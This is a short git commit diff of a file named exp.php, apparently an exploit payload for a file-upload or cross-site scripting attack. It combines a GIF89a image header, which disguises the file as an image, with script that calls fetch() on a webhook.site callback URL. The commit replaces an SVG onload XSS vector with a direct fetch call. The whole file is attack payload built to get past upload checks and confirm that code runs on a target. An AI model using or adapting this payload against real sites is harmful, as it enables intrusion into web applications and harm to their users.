10be5e8484f5d6351eaaddf0afee6331e3524e3c
ngocdm2 <ngocdm002@gmail.com>
2025-07-23 14:39:45 +0700

    Update exp.php

--- exp.php
+++ exp.php
@@ -1,6 +1,6 @@
 GIF89a;
 <?php
 <script>
-    <svg onload=fetch('https://webhook.site/cd86bf55-e335-4cb4-91c3-93c0e0093eee')>
+    fetch('https://webhook.site/cd86bf55-e335-4cb4-91c3-93c0e0093eee');
 </script>
 ?>
